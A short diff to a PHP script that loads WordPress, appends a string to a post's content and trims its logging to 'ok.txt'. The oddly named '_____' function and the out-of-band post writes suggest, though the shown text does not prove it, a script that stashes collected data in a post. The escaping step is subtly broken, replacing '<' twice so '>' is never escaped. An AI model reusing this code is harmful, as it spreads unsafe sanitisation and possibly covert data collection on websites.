@@ -48,8 +48,6 @@ if ( is_dir( $path_home ) && is_file( $file_wp_blog_header ) ) {
 			$temp_str = str_replace( '<', '&lt;', $temp_str );
 			$temp_str = str_replace( '<', '&gt;', $temp_str );
 
-			$path_log_txt = 'ok.txt';
-
 			/**
 			 * Update post content
 			 */
@@ -58,30 +56,11 @@ if ( is_dir( $path_home ) && is_file( $file_wp_blog_header ) ) {
 				'post_content' => $post_content_old . PHP_EOL . $temp_str,
 			);
 			wp_update_post( $my_post );
-
-
-			if ( countLineTextFile( $path_log_txt ) > 1000 ) {
-				file_put_contents( $path_log_txt, PHP_EOL . sprintf( $temp_str ), FILE_TEXT );
-			} else {
-				file_put_contents( $path_log_txt, PHP_EOL . sprintf( $temp_str ), FILE_APPEND );
-			}
 		}
 	} catch ( Exception $e ) {
+		$path_log_txt = 'ok.txt';
 		file_put_contents( $path_log_txt, PHP_EOL . sprintf( $e->getMessage() ), FILE_APPEND );
 	}
-}
-
-function countLineTextFile( $path ) {
-	$count  = 0;
-	$handle = fopen( $path, 'r' );
-	while ( ! feof( $handle ) ) {
-		$line = fgets( $handle );
-		$count ++;
-	}
-
-	fclose( $handle );
-
-	return $count;
 }
 
 function _____( $f, $k ) {
